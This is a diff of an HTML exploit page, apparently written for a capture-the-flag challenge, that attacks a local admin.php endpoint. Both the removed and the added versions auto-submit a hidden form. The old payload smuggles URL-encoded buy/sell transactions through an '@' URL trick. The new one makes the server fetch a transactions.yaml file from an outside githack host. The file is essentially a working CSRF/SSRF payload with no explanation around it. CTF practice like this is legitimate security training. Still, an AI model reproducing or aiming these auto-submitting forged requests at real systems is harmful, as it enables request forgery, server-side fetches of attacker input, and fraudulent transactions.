@@ -1,5 +1,17 @@
-<!doctype html>
-<form method="POST" action="http://localhost:5000/admin.php">
-  <input type="hidden" name="url" value="http://localhost:5000/admin.php@localhost:5000/index.php?html=%5B%7B%22amount%22%3A5000000%2C%22currency%22%3A%22AAA%22%2C%22op%22%3A%22BUY%22%7D%2C%7B%22amount%22%3A5000000%2C%22currency%22%3A%22AAA%22%2C%22op%22%3A%22SELL%22%7D%2C%7B%22amount%22%3A1%2C%22currency%22%3A%22FL%22%2C%22op%22%3A%22BUY%22%7D%5D">
-</form>
-<script>document.forms[0].submit()</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CTF Exploit</title>
+</head>
+<body>
+    <h1>Exploiting admin.php...</h1>
+    <form id="exploit" method="POST" action="http://localhost:5000/admin.php">
+        <input type="hidden" name="url" value="https://rawcdn.githack.com/BerlianGabriel/ctf/main/transactions.yaml">
+    </form>
+    <script>
+        setTimeout(function() {
+            document.getElementById('exploit').submit();
+        }, 1000);
+    </script>
+</body>
+</html>
